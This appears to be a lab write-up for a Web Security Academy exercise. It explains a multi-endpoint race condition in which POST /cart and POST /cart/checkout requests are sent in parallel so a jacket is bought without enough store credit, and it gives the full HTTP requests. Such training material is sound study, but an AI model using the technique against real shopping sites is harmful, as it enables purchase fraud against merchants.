## Multi-endpoint race conditions

This lab's purchasing flow contains a race condition that enables you to purchase items for an unintended price.

To solve the lab, successfully purchase a Lightweight L33t Leather Jacket.

You can log into your account with the following credentials: wiener:peter.

Note : 

Solving this lab requires Burp Suite 2023.9 or higher.

Tip :

When experimenting, we recommend purchasing the gift card as you can later redeem this to avoid running out of store credit.

## Notes

- /admin
- /login
- /cart
- Exploit server

## Resume

1. Analyze the shopping cart workflow
2. Confirm server-side session cart storage
3. Benchmark request timing
4. Identify the race window
5. Add the expensive item during checkout
6. Trigger the race condition
7. Purchase the jacket without sufficient funds

## Solve

Purchase a gift card normally to observe the application behavior.

Important endpoints:

- `POST /cart` → Add items to cart
- `POST /cart/checkout` → Complete checkout
- `GET /cart` → Display cart contents

Send the following request with and without the session cookie:

```http
GET /cart HTTP/2
Host: 0a6700d60364665c81137a2d004e00c9.web-security-academy.net
Cookie: session=lW41UcGiu88lCVV4epAqkDwhCkhnS8my
```

Without the session cookie, the cart is empty.

This confirms:

- Cart data is stored server-side
- Cart operations are tied to the session
- Potential for session-based race conditions

Create a Repeater group containing:

1. `POST /cart`
2. `POST /cart/checkout`

Add a homepage request at the start of the group:

```http
GET / HTTP/2
Host: 0a6700d60364665c81137a2d004e00c9.web-security-academy.net
Cookie: session=lW41UcGiu88lCVV4epAqkDwhCkhnS8my
```

Send all requests sequentially over a single connection.

Observation:

- The first request is slower
- Subsequent requests execute within a much smaller time window

This reduces network overhead and improves race condition reliability.


Ensure your cart only contains a gift card.

Modify the `POST /cart` request to add the leather jacket:

```http
POST /cart HTTP/2
Host: 0a6700d60364665c81137a2d004e00c9.web-security-academy.net
Cookie: session=lW41UcGiu88lCVV4epAqkDwhCkhnS8my
Content-Type: application/x-www-form-urlencoded

productId=1&redir=PRODUCT&quantity=1
```

`productId=1` corresponds to the `Lightweight L33t Leather Jacket`.

```http
POST /cart/checkout HTTP/2
Host: 0a6700d60364665c81137a2d004e00c9.web-security-academy.net
Cookie: session=lW41UcGiu88lCVV4epAqkDwhCkhnS8my
Content-Type: application/x-www-form-urlencoded

csrf=r5tfE8g1JqDoiiYmei8fCwsqfq3BNHTk
```

Send the following requests in parallel:

1. `POST /cart`
2. `POST /cart/checkout`

If successful:

- The checkout validation executes before the jacket is added
- The order finalization includes the jacket
- The purchase succeeds despite insufficient funds

If the attack fails:

- Remove the jacket from the cart
- Add another gift card
- Retry the parallel request attack

This may require several attempts.


The leather jacket is successfully purchased without enough store credit, solving the lab.

